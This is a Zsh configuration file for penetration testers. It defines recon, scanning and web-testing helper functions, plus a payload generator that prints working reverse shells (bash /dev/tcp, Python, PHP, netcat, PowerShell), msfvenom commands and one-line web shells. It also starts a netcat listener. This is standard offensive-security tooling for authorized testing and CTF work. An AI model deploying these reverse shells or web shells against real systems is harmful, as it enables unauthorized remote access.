# =====================================
# Cyb0rgdoll Cybersecurity Configuration
# =====================================
# 
# A comprehensive Zsh configuration for cybersecurity professionals,
# penetration testers, and security researchers.
#
# Features:
# - Automated reconnaissance tools
# - Web application testing suite
# - Payload generation utilities
# - Organized file management
# - Easy copy/paste functionality
# - Competition-ready environment
#
# Installation:
# 1. Backup your current .zshrc: cp ~/.zshrc ~/.zshrc.backup
# 2. Replace with this file or append to existing configuration
# 3. Install oh-my-zsh if not present: sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
# 4. Run: source ~/.zshrc
# 5. Run: setup-cybersec to initialize environment
#
# GitHub: https://github.com/cyb0rgdoll
# License: MIT
#
# =====================================

# Basic Path Configuration
export PATH=$HOME/bin:/usr/local/bin:$PATH

# Oh-My-Zsh Configuration
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="robbyrussell"

# Recommended plugins for cybersecurity work
plugins=(
    git
    sudo
    zsh-autosuggestions
    zsh-syntax-highlighting
    zsh-completions
    command-not-found
    colored-man-pages
    extract
    web-search
    copyfile
    copybuffer
    dirhistory
    history
    jsontools
    urltools
    encode64
)

# Load Oh-My-Zsh (install if not present)
if [ -f "$ZSH/oh-my-zsh.sh" ]; then
    source $ZSH/oh-my-zsh.sh
else
    echo "⚠️  Oh-My-Zsh not found. Install with:"
    echo "sh -c \"\$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\""
fi

# User configuration
export LANG=en_US.UTF-8

# Preferred editor
if [[ -n $SSH_CONNECTION ]]; then
  export EDITOR='vim'
else
  export EDITOR='nano'
fi

# Enhanced History Configuration
HISTSIZE=50000
HISTFILE=~/.zsh_history
SAVEHIST=50000
setopt APPEND_HISTORY
setopt SHARE_HISTORY
setopt HIST_EXPIRE_DUPS_FIRST
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_FIND_NO_DUPS
setopt HIST_IGNORE_SPACE
setopt HIST_SAVE_NO_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_VERIFY

# Disable history expansion (!)
set +H

# Auto-completion configuration
autoload -U compinit && compinit
zstyle ':completion:*' matcher-list 'm:{a-z}={A-Za-z}'
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*' menu select
zstyle ':completion:*' special-dirs true

# =====================================
# CYBERSECURITY BANNER
# =====================================

# Get current user's IP (customize as needed)
get_local_ip() {
    ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1 || echo "Unknown"
}

# Cybersecurity Environment Banner
cybersec_banner() {
    echo ""
    echo "🛡️  CYBERSECURITY ENVIRONMENT"
    echo "📡 Local IP: $(get_local_ip)"
    echo "👤 User: $(whoami)"
    echo "🏠 Home: $HOME"
    echo ""
    echo "🚀 Quick Start:"
    echo "  discover <network>       - Find live hosts (e.g., 192.168.1.0/24)"
    echo "  workspace                - Jump to cybersec workspace"
    echo "  quickscan <ip>           - Automated target reconnaissance"
    echo "  revshell <port>          - Generate reverse shell + start listener"
    echo "  webtest <url>            - Complete web application testing"
    echo "  payload <type> [port]    - Generate various payloads"
    echo ""
    echo "🔧 Additional Tools:"
    echo "  recon-domain <domain>    - Subdomain enumeration + tech detection"
    echo "  enum <ip>                - Vulnerability enumeration"
    echo "  portscan <ip> [ports]    - Detailed port scanning"
    echo "  smbenum <ip>             - SMB/NetBIOS enumeration"
    echo "  setup-cybersec           - Initialize cybersecurity environment"
    echo "  install-pentest-tools    - Install additional tools"
    echo "  viewfile <file>          - Display file with line numbers"
    echo "  copytext <file>          - Display file for easy copying"
    echo ""
    echo "📖 Documentation: Type 'cybersec-help' for detailed usage"
    echo ""
}

# Show banner on startup
cybersec_banner

# =====================================
# BASIC ALIASES
# =====================================

alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias grep='grep --color=auto'
alias view='less +F'

# Quick navigation
alias workspace='cd ~/cybersec 2>/dev/null || { mkdir -p ~/cybersec && cd ~/cybersec; }'
alias scans='cd ~/cybersec/scans 2>/dev/null || echo "Run setup-cybersec first"'
alias reports='cd ~/cybersec/reports 2>/dev/null || echo "Run setup-cybersec first"'
alias tools='cd ~/cybersec/tools 2>/dev/null || echo "Run setup-cybersec first"'

# =====================================
# CORE CYBERSECURITY FUNCTIONS
# =====================================

# Network Discovery
discover() {
    if [ -z "$1" ]; then
        echo "Usage: discover <network> (e.g., 192.168.1.0/24)"
        echo "Performs network discovery to find live hosts"
        return 1
    fi
    
    echo "🔍 Discovering live hosts on $1..."
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="discovery_${timestamp}.txt"
    
    if command -v nmap &> /dev/null; then
        nmap -sn $1 | grep -E "Nmap scan report|MAC Address" | tee $output_file
        echo "✅ Results saved to: $output_file"
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# Quick Target Scanning
quickscan() {
    if [ -z "$1" ]; then
        echo "Usage: quickscan <ip>"
        echo "Performs quick reconnaissance on target"
        return 1
    fi
    
    local target=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local scan_dir="quickscan_${target}_${timestamp}"
    
    echo "🎯 Quick scanning $target..."
    mkdir -p "$scan_dir"
    cd "$scan_dir"
    
    if command -v nmap &> /dev/null; then
        # Port scan
        echo "🔍 Port scanning..."
        nmap -sC -sV -oA quickscan_$target $target
        
        # Check for web services
        if nmap -p 80,443,8080,8443 $target | grep -q "open"; then
            echo "🌐 Web services detected, running basic web tests..."
            
            if command -v whatweb &> /dev/null; then
                whatweb http://$target 2>/dev/null > whatweb_http.txt || true
                whatweb https://$target 2>/dev/null > whatweb_https.txt || true
            fi
            
            if command -v curl &> /dev/null; then
                curl -I http://$target 2>/dev/null > headers_http.txt || true
                curl -I https://$target 2>/dev/null > headers_https.txt || true
            fi
        fi
        
        echo "✅ Quick scan complete - results in: $(pwd)"
        cd ..
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
        cd ..
        rmdir "$scan_dir" 2>/dev/null
    fi
}

# Reverse Shell Generator and Listener
revshell() {
    local port=${1:-4444}
    local ip=$(get_local_ip)
    
    echo "🐚 Reverse Shell Payloads (IP: $ip, Port: $port)"
    echo "════════════════════════════════════════════════"
    echo ""
    echo "🐧 Linux/Unix Payloads:"
    echo "Bash:"
    echo "  bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo "Python3:"
    echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "🪟 Windows Payloads:"
    echo "PowerShell:"
    echo "  powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo ""
    echo "🎧 Starting netcat listener on port $port..."
    echo "Press Ctrl+C to stop the listener"
    echo ""
    
    if command -v nc &> /dev/null; then
        nc -lvnp $port
    else
        echo "❌ netcat not found. Install with: sudo apt install netcat-openbsd"
        echo "Alternative: ncat -lvnp $port"
    fi
}

# Web Application Testing
webtest() {
    if [ -z "$1" ]; then
        echo "Usage: webtest <url>"
        echo "Performs comprehensive web application testing"
        return 1
    fi
    
    local url=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local test_dir="webtest_${timestamp}"
    
    echo "🌐 Web application testing for $url"
    mkdir -p "$test_dir"
    cd "$test_dir"
    
    echo "📋 Technology detection..."
    if command -v whatweb &> /dev/null; then
        whatweb $url | tee whatweb.txt
    else
        echo "whatweb not found - install with: sudo apt install whatweb"
    fi
    
    echo "🔍 Basic directory enumeration..."
    if command -v gobuster &> /dev/null; then
        if [ -f /usr/share/wordlists/dirb/common.txt ]; then
            gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt -q &
        else
            echo "Wordlist not found - install with: sudo apt install wordlists"
        fi
    else
        echo "gobuster not found - install with: sudo apt install gobuster"
    fi
    
    echo "🛡️ Basic security scan..."
    if command -v nikto &> /dev/null; then
        nikto -h $url -o nikto.txt &
    else
        echo "nikto not found - install with: sudo apt install nikto"
    fi
    
    echo "📡 HTTP headers analysis..."
    if command -v curl &> /dev/null; then
        curl -I $url 2>/dev/null > headers.txt || echo "Failed to fetch headers"
    fi
    
    echo "✅ Web testing initiated - results will be in: $(pwd)"
    echo "Note: Some scans are running in background"
    cd ..
}

# =====================================
# PAYLOAD GENERATION
# =====================================

payload() {
    local type=${1:-help}
    local ip=$(get_local_ip)
    local port=${2:-4444}
    
    case $type in
        "help"|"")
            echo "Usage: payload <type> [port]"
            echo ""
            echo "Available payload types:"
            echo "  bash         - Bash reverse shell"
            echo "  python       - Python reverse shell"
            echo "  php          - PHP reverse shell"
            echo "  nc           - Netcat reverse shell"
            echo "  powershell   - PowerShell reverse shell"
            echo "  msfvenom     - MSFvenom payload examples"
            echo "  webshell     - Simple web shells"
            echo ""
            echo "Example: payload bash 4444"
            ;;
        "bash")
            echo "🐧 Bash Reverse Shell (IP: $ip, Port: $port):"
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        "python"|"py")
            echo "🐍 Python Reverse Shell (IP: $ip, Port: $port):"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        "php")
            echo "🌐 PHP Reverse Shell (IP: $ip, Port: $port):"
            echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        "nc"|"netcat")
            echo "🔌 Netcat Reverse Shell (IP: $ip, Port: $port):"
            echo "Traditional: nc -e /bin/sh $ip $port"
            echo "Alternative: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        "powershell"|"ps")
            echo "🪟 PowerShell Reverse Shell (IP: $ip, Port: $port):"
            echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
            ;;
        "msfvenom"|"msf")
            echo "🎯 MSFvenom Payload Examples (IP: $ip, Port: $port):"
            echo ""
            echo "Linux x64 ELF:"
            echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > shell"
            echo ""
            echo "Windows x64 EXE:"
            echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe"
            echo ""
            echo "PHP Web Shell:"
            echo "msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -f raw > shell.php"
            echo ""
            echo "Java WAR:"
            echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war"
            ;;
        "webshell")
            echo "🌐 Simple Web Shells:"
            echo ""
            echo "PHP:"
            echo "<?php system(\$_GET['cmd']); ?>"
            echo ""
            echo "ASP:"
            echo "<%eval request(\"cmd\")%>"
            echo ""
            echo "JSP:"
            echo "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
            ;;
        *)
            echo "❌ Unknown payload type: $type"
            echo "Use 'payload help' for available options."
            ;;
    esac
}

# =====================================
# RECONNAISSANCE FUNCTIONS
# =====================================

# Domain Reconnaissance
recon-domain() {
    if [ -z "$1" ]; then
        echo "Usage: recon-domain <domain>"
        echo "Performs subdomain enumeration and technology detection"
        return 1
    fi
    
    local domain=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local recon_dir="recon_${domain}_${timestamp}"
    
    echo "🔍 Domain reconnaissance for $domain..."
    mkdir -p "$recon_dir"
    cd "$recon_dir"
    
    # Subdomain enumeration
    echo "🔍 Subdomain enumeration..."
    if command -v subfinder &> /dev/null; then
        subfinder -d $domain -o subdomains.txt
    else
        echo "subfinder not found - install from: https://github.com/projectdiscovery/subfinder"
    fi
    
    # Check live hosts
    if [ -f subdomains.txt ] && command -v httpx &> /dev/null; then
        echo "🌐 Checking live hosts..."
        cat subdomains.txt | httpx -silent > live_hosts.txt
    elif command -v curl &> /dev/null; then
        echo "🌐 Basic host checking with curl..."
        if [ -f subdomains.txt ]; then
            while IFS= read -r subdomain; do
                if curl -s --connect-timeout 3 "$subdomain" > /dev/null 2>&1; then
                    echo "$subdomain" >> live_hosts.txt
                fi
            done < subdomains.txt
        fi
    fi
    
    echo "✅ Domain reconnaissance complete - results in: $(pwd)"
    cd ..
}

# Vulnerability Enumeration
enum() {
    if [ -z "$1" ]; then
        echo "Usage: enum <ip>"
        echo "Performs vulnerability enumeration on target"
        return 1
    fi
    
    local target=$1
    echo "🔍 Vulnerability enumeration on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -sC -sV --script=vuln $target
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# Port Scanning
portscan() {
    if [ -z "$1" ]; then
        echo "Usage: portscan <ip> [ports]"
        echo "Performs detailed port scanning"
        echo "Example: portscan 192.168.1.1 1-1000"
        return 1
    fi
    
    local target=$1
    local ports=${2:-"1-10000"}
    
    echo "🔌 Scanning ports $ports on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -p $ports -sC -sV $target
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# SMB Enumeration
smbenum() {
    if [ -z "$1" ]; then
        echo "Usage: smbenum <ip>"
        echo "Performs SMB/NetBIOS enumeration"
        return 1
    fi
    
    local target=$1
    echo "📂 SMB enumeration on $target..."
    
    if command -v enum4linux &> /dev/null; then
        enum4linux -a $target
    else
        echo "enum4linux not found - trying smbclient..."
    fi
    
    if command -v smbclient &> /dev/null; then
        echo "📂 SMB shares:"
        smbclient -L $target -N 2>/dev/null || echo "SMB connection failed"
    else
        echo "❌ SMB tools not found. Install with: sudo apt install enum4linux smbclient"
    fi
}

# =====================================
# FILE OPERATIONS & UTILITIES
# =====================================

# Enhanced file viewing with line numbers
viewfile() {
    if [ -z "$1" ]; then
        echo "Usage: viewfile <file>"
        echo "Display file with line numbers for easy reference"
        return 1
    fi
    
    if command -v batcat &> /dev/null; then
        batcat --paging=never --style=numbers --wrap=never "$1"
    elif command -v bat &> /dev/null; then
        bat --paging=never --style=numbers --wrap=never "$1"
    else
        cat -n "$1"
    fi
}

# Plain text output for copying
copytext() {
    if [ -z "$1" ]; then
        echo "Usage: copytext <file>"
        echo "Display file content for easy copying (no formatting)"
        return 1
    fi
    
    if command -v batcat &> /dev/null; then
        batcat --paging=never --style=plain --wrap=never "$1"
    elif command -v bat &> /dev/null; then
        bat --paging=never --style=plain --wrap=never "$1"
    else
        cat "$1"
    fi
}

# Copy specific lines from a file
copylines() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: copylines <file> <line_number> [end_line]"
        echo "Extract specific lines from a file"
        echo "Example: copylines script.sh 10 20"
        return 1
    fi
    
    local file=$1
    local start=$2
    local end=${3:-$2}
    
    sed -n "${start},${end}p" "$file"
}

# Copy to clipboard (if available)
toclip() {
    if [ -z "$1" ]; then
        echo "Usage: toclip <file>"
        echo "Copy file content to clipboard"
        return 1
    fi
    
    if command -v xclip &> /dev/null; then
        cat "$1" | xclip -selection clipboard
        echo "✅ Content copied to clipboard"
    elif command -v pbcopy &> /dev/null; then
        cat "$1" | pbcopy
        echo "✅ Content copied to clipboard"
    else
        echo "❌ Clipboard tool not found. Install xclip (Linux) or use pbcopy (macOS)"
        echo "Content:"
        cat "$1"
    fi
}

# =====================================
# ENVIRONMENT SETUP
# =====================================

# Setup cybersecurity environment
setup-cybersec() {
    echo "🏗️ Setting up cybersecurity environment..."
    
    # Create directory structure
    mkdir -p ~/cybersec/{scans,exploits,loot,notes,scripts,tools,wordlists,reports}
    
    # Create subdirectories
    mkdir -p ~/cybersec/scans/{nmap,web,vuln}
    mkdir -p ~/cybersec/reports/{daily,final}
    mkdir -p ~/cybersec/notes/{targets,methodology,findings}
    
    # Extract rockyou wordlist if available
    if [ -f /usr/share/wordlists/rockyou.txt.gz ] && [ ! -f /usr/share/wordlists/rockyou.txt ]; then
        echo "🔓 Extracting rockyou.txt wordlist..."
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || echo "Failed to extract rockyou.txt"
    fi
    
    # Create useful scripts
    cat > ~/cybersec/scripts/listener.sh << 'EOF'
#!/bin/bash
# Simple netcat listener
port=${1:-4444}
echo "Starting listener on port $port..."
nc -lvnp $port
EOF
    chmod +x ~/cybersec/scripts/listener.sh
    
    # Create notes template
    cat > ~/cybersec/notes/template.md << 'EOF'
# Penetration Test Notes

## Target Information
- **Target**: 
- **Date**: 
- **Scope**: 

## Reconnaissance
### Network Discovery
- 

### Port Scanning
- 

### Service Enumeration
- 

## Vulnerability Assessment
### Findings
- 

### Exploitation Attempts
- 

## Post-Exploitation
- 

## Recommendations
- 

## Timeline
- 
EOF
    
    echo "✅ Cybersecurity environment created!"
    echo ""
    echo "📁 Directory structure:"
    echo "   ~/cybersec/              - Main workspace"
    echo "   ├── scans/               - Scan results"
    echo "   ├── exploits/            - Exploit code"
    echo "   ├── loot/                - Extracted data"
    echo "   ├── notes/               - Documentation"
    echo "   ├── scripts/             - Custom scripts"
    echo "   ├── tools/               - Additional tools"
    echo "   ├── wordlists/           - Custom wordlists"
    echo "   └── reports/             - Final reports"
    echo ""
    echo "🚀 Quick start: cd ~/cybersec"
}

# Install common penetration testing tools
install-pentest-tools() {
    echo "📦 Installing common penetration testing tools..."
    
    # Update package list
    sudo apt update
    
    # Core tools
    local core_tools=(
        "nmap"           # Network scanning
        "gobuster"       # Directory/DNS bruteforcing
        "nikto"          # Web vulnerability scanner
        "whatweb"        # Web technology identification
        "enum4linux"     # SMB enumeration
        "smbclient"      # SMB client
        "curl"           # HTTP client
        "wget"           # Download utility
        "git"            # Version control
        "python3-pip"    # Python package manager
        "dirb"           # Web content scanner
        "hydra"          # Login bruteforcer
        "john"           # Password cracker
        "hashcat"        # Advanced password recovery
        "sqlmap"         # SQL injection tool
        "netcat-openbsd" # Network utility
        "socat"          # Network relay
        "xclip"          # Clipboard utility
        "tree"           # Directory tree view
        "jq"             # JSON processor
    )
    
    echo "Installing core tools..."
    for tool in "${core_tools[@]}"; do
        if ! command -v ${tool%% *} &> /dev/null; then
            echo "Installing $tool..."
            sudo apt install -y "$tool" || echo "Failed to install $tool"
        else
            echo "$tool already installed"
        fi
    done
    
    # Install wordlists
    if [ ! -d "/usr/share/wordlists" ]; then
        echo "Installing wordlists..."
        sudo apt install -y wordlists || echo "Failed to install wordlists"
    fi
    
    # Install bat for better file viewing
    if ! command -v bat &> /dev/null && ! command -v batcat &> /dev/null; then
        echo "Installing bat for enhanced file viewing..."
        sudo apt install -y bat || echo "Failed to install bat"
    fi
    
    echo "✅ Core tools installation complete!"
    echo ""
    echo "🔧 Optional: Install Go-based tools with 'install-go-tools'"
    echo "🔧 Optional: Install additional Python tools with 'install-python-tools'"
}

# Install Go-based security tools
install-go-tools() {
    echo "📦 Installing Go-based security tools..."
    
    # Check if Go is installed
    if ! command -v go &> /dev/null; then
        echo "Installing Go programming language..."
        wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
        sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
        rm go1.21.5.linux-amd64.tar.gz
        export PATH=$PATH:/usr/local/go/bin
        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.zshrc
    fi
    
    # Install Go-based tools
    local go_tools=(
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
        "github.com/tomnomnom/assetfinder@latest"
        "github.com/tomnomnom/waybackurls@latest"
        "github.com/tomnomnom/httprobe@latest"
        "github.com/tomnomnom/meg@latest"
        "github.com/tomnomnom/gf@latest"
    )
    
    for tool in "${go_tools[@]}"; do
        echo "Installing $(basename $tool)..."
        go install "$tool" || echo "Failed to install $tool"
    done
    
    echo "✅ Go tools installation complete!"
}

# Install Python security tools
install-python-tools() {
    echo "📦 Installing Python security tools..."
    
    local python_tools=(
        "impacket"          # Network protocols
        "bloodhound"        # Active Directory analysis
        "crackmapexec"      # Network service testing
        "droopescan"        # Drupal/WordPress scanner
        "dirsearch"         # Web path scanner
        "sublist3r"         # Subdomain enumeration
        "requests"          # HTTP library
        "beautifulsoup4"    # HTML parsing
        "python-nmap"       # Nmap Python library
    )
    
    for tool in "${python_tools[@]}"; do
        echo "Installing $tool..."
        pip3 install "$tool" --break-system-packages 2>/dev/null || pip3 install "$tool" || echo "Failed to install $tool"
    done
    
    echo "✅ Python tools installation complete!"
}

# =====================================
# UTILITY FUNCTIONS
# =====================================

# Network information
myip() {
    echo "🌐 Network Information:"
    echo "Internal IP: $(get_local_ip)"
    echo "External IP: $(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo 'Unable to fetch')"
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
}

# Quick port check
ports() {
    if [ -z "$1" ]; then
        echo "Usage: ports <ip>"
        echo "Quickly scan common ports on target"
        return 1
    fi
    
    local target=$1
    echo "🔌 Scanning common ports on $target..."
    
    if command -v nmap &> /dev/null; then
        nmap -F $target | grep '^[0-9]'
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# Start a simple HTTP server
serve() {
    local port=${1:-8000}
    echo "🌐 Starting HTTP server on port $port..."
    echo "Access at: http://$(get_local_ip):$port"
    echo "Press Ctrl+C to stop"
    
    if command -v python3 &> /dev/null; then
        python3 -m http.server $port
    elif command -v python &> /dev/null; then
        python -m SimpleHTTPServer $port
    else
        echo "❌ Python not found. Cannot start HTTP server."
    fi
}

# Generate random passwords
genpass() {
    local length=${1:-16}
    local count=${2:-5}
    
    echo "🔐 Generated passwords (length: $length):"
    for i in $(seq 1 $count); do
        if command -v openssl &> /dev/null; then
            openssl rand -base64 $((length * 3 / 4)) | head -c $length
        else
            cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c $length
        fi
        echo
    done
}

# Encode/Decode utilities
encode() {
    local type=${1:-help}
    local data="$2"
    
    case $type in
        "help"|"")
            echo "Usage: encode <type> <data>"
            echo "Types: base64, url, html, hex"
            ;;
        "base64"|"b64")
            echo -n "$data" | base64
            ;;
        "url")
            echo -n "$data" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))"
            ;;
        "html")
            echo -n "$data" | python3 -c "import html, sys; print(html.escape(sys.stdin.read().strip()))"
            ;;
        "hex")
            echo -n "$data" | xxd -p | tr -d '\n'
            ;;
        *)
            echo "❌ Unknown encoding type: $type"
            ;;
    esac
}

decode() {
    local type=${1:-help}
    local data="$2"
    
    case $type in
        "help"|"")
            echo "Usage: decode <type> <data>"
            echo "Types: base64, url, html, hex"
            ;;
        "base64"|"b64")
            echo -n "$data" | base64 -d
            ;;
        "url")
            echo -n "$data" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))"
            ;;
        "html")
            echo -n "$data" | python3 -c "import html, sys; print(html.unescape(sys.stdin.read().strip()))"
            ;;
        "hex")
            echo -n "$data" | xxd -r -p
            ;;
        *)
            echo "❌ Unknown decoding type: $type"
            ;;
    esac
}

# =====================================
# HELP SYSTEM
# =====================================

cybersec-help() {
    echo "🛡️ CYBERSECURITY ENVIRONMENT HELP"
    echo "=================================="
    echo ""
    echo "🚀 CORE FUNCTIONS:"
    echo "  discover <network>       - Network discovery (e.g., discover 192.168.1.0/24)"
    echo "  quickscan <ip>           - Quick target reconnaissance"
    echo "  portscan <ip> [ports]    - Detailed port scanning"
    echo "  enum <ip>                - Vulnerability enumeration"
    echo "  smbenum <ip>             - SMB/NetBIOS enumeration"
    echo "  recon-domain <domain>    - Subdomain enumeration and tech detection"
    echo ""
    echo "🌐 WEB TESTING:"
    echo "  webtest <url>            - Comprehensive web application testing"
    echo "  serve [port]             - Start HTTP server (default: 8000)"
    echo ""
    echo "🐚 PAYLOAD GENERATION:"
    echo "  payload <type> [port]    - Generate various payloads"
    echo "  revshell [port]          - Generate reverse shell + start listener"
    echo "  genpass [length] [count] - Generate random passwords"
    echo ""
    echo "📁 FILE OPERATIONS:"
    echo "  viewfile <file>          - Display file with line numbers"
    echo "  copytext <file>          - Display file for easy copying"
    echo "  copylines <file> <start> [end] - Extract specific lines"
    echo "  toclip <file>            - Copy file to clipboard"
    echo ""
    echo "🔧 UTILITIES:"
    echo "  encode <type> <data>     - Encode data (base64, url, html, hex)"
    echo "  decode <type> <data>     - Decode data"
    echo "  myip                     - Show network information"
    echo "  ports <ip>               - Quick port scan"
    echo ""
    echo "⚙️ SETUP:"
    echo "  setup-cybersec           - Initialize cybersecurity environment"
    echo "  install-pentest-tools    - Install common penetration testing tools"
    echo "  install-go-tools         - Install Go-based security tools"
    echo "  install-python-tools     - Install Python security tools"
    echo ""
    echo "🗂️ NAVIGATION:"
    echo "  workspace                - Jump to main cybersec directory"
    echo "  scans                    - Jump to scans directory"
    echo "  reports                  - Jump to reports directory"
    echo "  tools                    - Jump to tools directory"
    echo ""
    echo "📖 For detailed information about a specific function, run: <function> --help"
    echo "🐛 Report issues: https://github.com/YOUR_USERNAME/pandabox-cybersec-config/issues"
}

# =====================================
# ADVANCED FEATURES
# =====================================

# Automated reconnaissance pipeline
autorecon() {
    if [ -z "$1" ]; then
        echo "Usage: autorecon <target>"
        echo "Performs automated reconnaissance on target"
        return 1
    fi
    
    local target=$1
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local recon_dir="autorecon_${target}_${timestamp}"
    
    echo "🤖 Starting automated reconnaissance on $target"
    mkdir -p "$recon_dir"
    cd "$recon_dir"
    
    # Phase 1: Basic enumeration
    echo "🔍 Phase 1: Basic enumeration..."
    if command -v nmap &> /dev/null; then
        nmap -sn $target > host_discovery.txt 2>&1
        nmap -sS -T4 --top-ports 1000 $target -oA top_ports
    fi
    
    # Phase 2: Service detection
    echo "🔍 Phase 2: Service detection..."
    if command -v nmap &> /dev/null; then
        open_ports=$(nmap -sS --top-ports 1000 $target | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
        if [ ! -z "$open_ports" ]; then
            nmap -sC -sV -p $open_ports $target -oA service_detection
        fi
    fi
    
    # Phase 3: Web enumeration
    echo "🌐 Phase 3: Web enumeration..."
    if command -v nmap &> /dev/null && nmap -p 80,443,8080,8443 $target | grep -q "open"; then
        mkdir web_enum
        cd web_enum
        
        if command -v whatweb &> /dev/null; then
            whatweb http://$target > whatweb_http.txt 2>/dev/null || true
            whatweb https://$target > whatweb_https.txt 2>/dev/null || true
        fi
        
        if command -v gobuster &> /dev/null && [ -f /usr/share/wordlists/dirb/common.txt ]; then
            gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt -o gobuster_http.txt -q &
            gobuster dir -u https://$target -w /usr/share/wordlists/dirb/common.txt -o gobuster_https.txt -q &
        fi
        
        cd ..
    fi
    
    # Phase 4: Vulnerability assessment
    echo "🛡️ Phase 4: Vulnerability assessment..."
    if command -v nmap &> /dev/null; then
        nmap --script vuln $target -oA vulnerability_scan &
    fi
    
    echo "✅ Automated reconnaissance complete!"
    echo "📁 Results saved in: $(pwd)"
    echo "📊 Summary files:"
    ls -la *.txt *.xml *.nmap 2>/dev/null || echo "No summary files generated"
    
    cd ..
}

# Traffic monitoring
monitor() {
    local interface=${1:-eth0}
    echo "📡 Monitoring traffic on interface: $interface"
    echo "Press Ctrl+C to stop"
    
    if command -v tcpdump &> /dev/null; then
        sudo tcpdump -i $interface -n
    elif command -v tshark &> /dev/null; then
        sudo tshark -i $interface
    else
        echo "❌ No packet capture tool found. Install tcpdump or wireshark."
    fi
}

# Simple vulnerability check
vulncheck() {
    if [ -z "$1" ]; then
        echo "Usage: vulncheck <ip>"
        echo "Performs basic vulnerability checks"
        return 1
    fi
    
    local target=$1
    echo "🔍 Basic vulnerability checks for $target..."
    
    if command -v nmap &> /dev/null; then
        echo "Checking for common vulnerabilities..."
        nmap --script vuln,exploit $target
    else
        echo "❌ nmap not found. Install with: sudo apt install nmap"
    fi
}

# =====================================
# CONFIGURATION
# =====================================

# Load API keys from config file
load_api_keys() {
    local config_file="$HOME/.config/cybersec/api_keys.env"
    
    if [ -f "$config_file" ]; then
        source "$config_file"
        echo "✅ API keys loaded from $config_file"
    else
